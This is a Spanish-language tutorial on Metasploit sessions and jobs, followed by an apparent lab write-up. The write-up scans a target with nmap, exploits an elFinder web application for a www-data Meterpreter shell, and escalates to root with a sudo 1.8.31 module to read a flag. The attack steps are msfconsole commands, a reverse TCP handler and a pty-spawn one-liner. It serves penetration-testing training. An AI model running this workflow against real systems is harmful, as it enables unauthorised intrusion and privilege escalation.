# Sessions y Jobs en Metasploit Framework

## Introducción a las Sessions

Una de las características más potentes de `msfconsole` es su capacidad para gestionar múltiples módulos simultáneamente. Esta funcionalidad se implementa mediante **Sessions**, que son interfaces de control dedicadas para cada módulo desplegado en el framework.

### Concepto de Session

Una session representa un canal de comunicación activo establecido entre `msfconsole` y un host objetivo. Este canal se crea típicamente después de la explotación exitosa de una vulnerabilidad o mediante módulos auxiliares que establecen conexiones persistentes.

### Persistencia y Ciclo de Vida

Las sessions poseen características importantes:

- **Ejecución en segundo plano**: Una vez que una session se coloca en background, continúa ejecutándose sin requerir atención directa del usuario
- **Persistencia de conexión**: La comunicación con el host objetivo se mantiene activa mientras la session esté viva
- **Vulnerabilidad a fallos**: Las sessions pueden morir si ocurren errores durante la ejecución del payload, causando el colapso del canal de comunicación

Este comportamiento permite a los pentesters mantener acceso a múltiples sistemas comprometidos mientras continúan trabajando con otros módulos o targets.

## Uso de Sessions

### Colocando Sessions en Background

Existen dos métodos principales para enviar una session al segundo plano:

**1. Combinación de teclas:**
```
[CTRL] + [Z]
```

**2. Comando explícito (en Meterpreter):**
```
meterpreter > background
```

Ambos métodos generan un mensaje de confirmación. Al aceptar, el usuario regresa al prompt principal de `msfconsole` (`msf6 >`), quedando libre para ejecutar otros módulos inmediatamente.

### Listado de Sessions Activas

Para visualizar todas las sessions actualmente activas, utilizamos el comando `sessions`:

```
msf6 exploit(windows/smb/psexec_psh) > sessions
```

**Salida esperada:**
```
Active sessions
===============

  Id  Name  Type                     Information                 Connection
  --  ----  ----                     -----------                 ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ MS01  10.10.10.129:443 -> 10.10.10.205:50501 (10.10.10.205)
```

**Interpretación de columnas:**

- **Id**: Identificador único de la session (usado para interactuar con ella)
- **Name**: Nombre opcional asignado a la session
- **Type**: Tipo de payload/session (meterpreter, shell, etc.)
- **Information**: Contexto del usuario y hostname del sistema comprometido
- **Connection**: Detalles de la conexión (IP local:puerto -> IP remota:puerto)

### Interactuando con Sessions Específicas

Para retomar el control de una session en background:

```
msf6 exploit(windows/smb/psexec_psh) > sessions -i 1
```

**Respuesta del sistema:**
```
[*] Starting interaction with 1...

meterpreter >
```

El prompt cambia al tipo de session específica (en este caso, `meterpreter >`), indicando que ahora estamos operando directamente sobre ese canal de comunicación.

## Casos de Uso Avanzados: Módulos Post-Explotación

### Ejecución de Módulos Adicionales sobre Sessions Existentes

Una aplicación práctica de las sessions es ejecutar múltiples módulos sobre un sistema ya comprometido sin necesidad de re-explotar vulnerabilidades.

**Flujo de trabajo típico:**

1. **Explotar el objetivo y obtener una session inicial**
2. **Enviar la session al background** usando `background` o `[CTRL] + [Z]`
3. **Buscar y seleccionar un módulo post-explotación**
4. **Configurar el módulo para usar la session existente**

### Módulos Post-Explotación

Los módulos diseñados para trabajar sobre sessions existentes generalmente se encuentran en la categoría **post**, refiriéndose a módulos de Post-Exploitation.

**Arquetipos principales de módulos post:**

- **Credential Gatherers**: Recolección de credenciales almacenadas en el sistema
- **Local Exploit Suggesters**: Análisis de vulnerabilidades locales para escalación de privilegios
- **Internal Network Scanners**: Escaneo de redes internas desde el sistema comprometido (pivoting)

### Configuración de Sessions en Módulos Post

Al ejecutar `show options` en un módulo post-explotación, encontraremos una opción para especificar la session:

```
SESSION    yes    The session to run this module on
```

Aquí indicamos el número de ID de la session sobre la cual queremos ejecutar el módulo.

## Jobs: Gestión de Tareas en Background

### Problema: Conflictos de Recursos

Consideremos el siguiente escenario:

1. Ejecutamos un exploit activo que escucha en un puerto específico (ej: 4444)
2. Necesitamos usar ese mismo puerto para un módulo diferente
3. Simplemente terminar la session con `[CTRL] + [C]` **no libera el puerto**

El puerto permanece en uso incluso después de la interrupción aparente, causando conflictos con nuevos módulos.

### Solución: Sistema de Jobs

Los **Jobs** son tareas que se ejecutan como trabajos en segundo plano dentro de `msfconsole`. A diferencia de las sessions, los jobs:

- Pueden iniciarse, listarse y detenerse de forma granular
- Liberan recursos correctamente al ser terminados
- Continúan ejecutándose incluso si la session asociada muere

### Menú de Ayuda de Jobs

```
msf6 exploit(multi/handler) > jobs -h
```

**Salida:**
```
Usage: jobs [options]

Active job manipulation and interaction.

OPTIONS:

    -K        Terminate all running jobs.
    -P        Persist all running jobs on restart.
    -S <opt>  Row search filter.
    -h        Help banner.
    -i <opt>  Lists detailed information about a running job.
    -k <opt>  Terminate jobs by job ID and/or range.
    -l        List all running jobs.
    -p <opt>  Add persistence to job by job ID
    -v        Print more detailed info.  Use with -i and -l
```

**Opciones clave:**

- **-l**: Lista todos los jobs en ejecución
- **-k [id]**: Termina un job específico por su ID
- **-K**: Termina todos los jobs activos
- **-i [id]**: Muestra información detallada de un job
- **-P**: Persiste jobs a través de reinicios de `msfconsole`

## Ejecutando Exploits como Jobs

### Comando Exploit con Opción -j

Para ejecutar un exploit como job desde el inicio, utilizamos la opción `-j`:

```
msf6 exploit(multi/handler) > exploit -h
```

**Opciones relevantes:**
```
OPTIONS:

    -J        Force running in the foreground, even if passive.
    -e <opt>  The payload encoder to use.  If none is specified, ENCODER is used.
    -f        Force the exploit to run regardless of the value of MinimumRank.
    -h        Help banner.
    -j        Run in the context of a job.
```

La opción **-j** ejecuta el exploit "en el contexto de un job", permitiendo que se ejecute completamente en background.

### Ejemplo Práctico

```
msf6 exploit(multi/handler) > exploit -j
```

**Salida:**
```
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.34:4444
```

El mensaje indica:
- El exploit está corriendo como job con ID 0
- El handler está activo escuchando en el puerto especificado
- Podemos continuar usando `msfconsole` para otras tareas

### Listado de Jobs Activos

```
msf6 exploit(multi/handler) > jobs -l
```

**Salida:**
```
Jobs
====

 Id  Name                    Payload                    Payload opts
 --  ----                    -------                    ------------
 0   Exploit: multi/handler  generic/shell_reverse_tcp  tcp://10.10.14.34:4444
```

**Columnas explicadas:**

- **Id**: Identificador único del job
- **Name**: Nombre del módulo ejecutándose
- **Payload**: Tipo de payload configurado
- **Payload opts**: Opciones del payload (LHOST:LPORT)

### Terminando Jobs

**Para terminar un job específico:**
```
msf6 exploit(multi/handler) > jobs -k 0
```

**Para terminar todos los jobs:**
```
msf6 exploit(multi/handler) > jobs -K
```

Usar `jobs -K` es particularmente útil cuando necesitamos limpiar completamente el estado de `msfconsole` y liberar todos los recursos (puertos, listeners, handlers) antes de iniciar una nueva fase de testing.

## Diferencias entre Sessions y Jobs

| Característica | Sessions | Jobs |
|----------------|----------|------|
| **Propósito** | Canal de comunicación con host comprometido | Tarea en background del framework |
| **Creación** | Resultado de exploit exitoso | Ejecución explícita con `-j` |
| **Persistencia** | Depende del canal de comunicación | Independiente de connections externas |
| **Interacción** | `sessions -i [id]` | No interactiva directamente |
| **Terminación** | Puede morir por fallo de payload | Controlada explícitamente por el usuario |
| **Uso típico** | Post-explotación, pivoting | Listeners, handlers, exploits pasivos |

## Mejores Prácticas

1. **Siempre verificar sessions activas** antes de cerrar `msfconsole` para no perder acceso a sistemas comprometidos
2. **Usar jobs para listeners persistentes** que necesiten estar activos durante períodos extendidos
3. **Limpiar jobs innecesarios** con `jobs -K` para liberar recursos del sistema
4. **Nombrar sessions** cuando se trabaja con múltiples hosts para facilitar la identificación
5. **Documentar IDs de sessions importantes** en notas de pentesting para referencia rápida

---


# Preguntas


#### El objetivo tiene una aplicación web específica en ejecución que podemos encontrar examinando el código fuente HTML. ¿Cuál es el nombre de esa aplicación web?


Lanzamos una traza `ICMP` para verificar que el host se encuentra activo:
<img width="921" height="211" alt="image" src="https://github.com/user-attachments/assets/5a9d4901-d731-4f43-b54e-39d05a18df92" />

Nos conecamos a msfconsole:
<img width="1227" height="820" alt="image" src="https://github.com/user-attachments/assets/a8fca1b7-971c-4a1c-b4ee-b2e18a5361c4" />

Creamos un workspace para el lab:
<img width="528" height="125" alt="image" src="https://github.com/user-attachments/assets/eca847ca-eb68-4b59-874d-f1cbe9a7a0d4" />

También podríamos haber realizado `db_nmap -sn <ip>` para agregar el host a la base de datos:
<img width="1186" height="384" alt="image" src="https://github.com/user-attachments/assets/757fdbcb-d331-40ca-832a-fa5c787d8343" />

Realizamos un `TCP SYN SCAN` de los top 1000 ports:
```bash
db_nmap -Pn -n --disable-arp-ping --reason -sS <ip>
```
<img width="1330" height="753" alt="image" src="https://github.com/user-attachments/assets/dcd7b0cf-fb8b-4e58-a13e-8398a89d5fee" />

Profundizamos el escaneo, para obtener más información, puntualmente escaneamos los puertos 22 y 80 para reconocer su versión. Además realizamos un escaneo con un conjunto de scripts NSE predefinidos para cada servicio y la categoría VULN de NSE. Además hacemos un reconocimiento de sistema operativo:
```bash
db_nmap -Pn -n --disable-arp-ping --reason -p22,80 -sV -sC --script=vuln -O <ip>
```

 Mejor es hacer directamente:
 ```bash
db_nmap -Pn -n --disable-arp-ping --reason -p80 -sV -sC <ip>
```
<img width="1603" height="324" alt="image" src="https://github.com/user-attachments/assets/dac1a8f5-5687-482a-9fd2-997d70053e99" />


---

# Encuentra el exploit existente en MSF y úsalo para obtener acceso al sistema objetivo. ¿Cuál es el nombre de usuario del usuario con el que obtuviste acceso?

Si hacemos vulns -p 80 vemos todos los CVE que en este caso, fueron obtenidos por el escaneo de nmap sobre el puerto 80, que en su mayoría deben ser de apache:
<img width="1882" height="762" alt="image" src="https://github.com/user-attachments/assets/dc2e996d-256f-4f40-b3e4-cd8d22d487d8" />

Buscamos manualmente los CVE que aparecen:
```bash
search cve:xxxx-xxxx
```

No se encuentran los exploits correspondientes a estos CVE, que en su mayoría deben ser de apache..

Entonces busquemos por elFinder:

<img width="1505" height="296" alt="image" src="https://github.com/user-attachments/assets/73f16ff4-bcd4-45fc-b9b9-d1265626c03e" />

Buscamos:
```bash
search "elfinder 2.1" type:exploit
```

<img width="1910" height="449" alt="image" src="https://github.com/user-attachments/assets/f82d2844-896c-4b9a-81c4-1d570fad775a" />

Ponemos `use 0` y configuramos:

```bash
set LHOST <ip_tun0>
hosts -R
check
exploit
```
<img width="1675" height="716" alt="image" src="https://github.com/user-attachments/assets/5dacb76c-9ef0-4776-804e-39622b3c654a" />

Hacemos `getuid`:
<img width="443" height="107" alt="image" src="https://github.com/user-attachments/assets/16727aec-5201-4881-a6a2-d8b597d78ac5" />


---


#### El sistema objetivo tiene una versión antigua de Sudo en ejecución. Encuentra la vulnerabilidad correspondiente y obtén acceso de superusuario al sistema objetivo. Encuentra el archivo flag.txt y envía su contenido como respuesta.


Enviamos la sesión a background:

<img width="1029" height="88" alt="image" src="https://github.com/user-attachments/assets/2e0b75ae-f64b-4b3f-a020-37fad42a17f8" />

Buscamos el módulo post `exploit suggester`:
```bash
search suggester type:post platform:linux
```

<img width="1728" height="371" alt="image" src="https://github.com/user-attachments/assets/ac8ffb1d-6c14-449a-8f0b-2161bb760d4a" />

```bash
use 0
options
sessions -l
set sessions <id>
```
<img width="1621" height="323" alt="image" src="https://github.com/user-attachments/assets/92fdd082-c368-4d61-a2dd-5670cc5d2737" />

Corremos el módulo con `run`:
<img width="1912" height="790" alt="image" src="https://github.com/user-attachments/assets/9a8db80d-196d-4c9d-8855-b6bb9606281d" />

Vemos el módulo `exploit/linux/local/sudoedit_bypass_priv_esc`, procedemos a utilizarlo:

```bash
back
use exploit/linux/local/sudoedit_bypass_priv_esc
options
sessions -l
set session <id>
exploit
```

<img width="1918" height="278" alt="image" src="https://github.com/user-attachments/assets/64e8c81d-bc5b-4657-b5bb-13b0f48c4ba5" />

Nos dice que necesita un archivo para editar.. lo cual no parece ser la correcta..

Probamos otro exploit y tampoco se puede:
<img width="1037" height="234" alt="image" src="https://github.com/user-attachments/assets/5db01b5c-b3d4-4980-9c78-b36688e975ea" />

Buscamos exploits para la versión específica de Sudo que habíamos encontrado:
```bash
search "sudo 1.8.31" type:exploit
```

<img width="1916" height="785" alt="image" src="https://github.com/user-attachments/assets/165dbb72-c9f3-4a2e-87f3-1f5522ef5dad" />

```bash
use 0
oprions
set session <id>
exploit
```

<img width="1574" height="426" alt="image" src="https://github.com/user-attachments/assets/6d6d82e5-1ff3-43be-b9a0-4c45c6eb25a0" />

Usamos el comando `search` para buscar `flag.txt`:
```bash
search -f flag.txt
```

<img width="868" height="204" alt="image" src="https://github.com/user-attachments/assets/3f15502a-a1dc-4758-97df-55dc98df435b" />

<img width="575" height="116" alt="image" src="https://github.com/user-attachments/assets/e327d335-a6eb-412a-9a85-0a7c29dd6dbd" />



---

`Nota`: Para saber la versión de sudo, cuando obtuvimos la meterpreter con `www-data` podríamos haber realizado el comando `sudo -V`:
```bash
shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
sudo -V
ctrl + z
bg
```

<img width="991" height="313" alt="image" src="https://github.com/user-attachments/assets/8ee980cb-757e-4f71-bf10-d44a3b8fa1eb" />
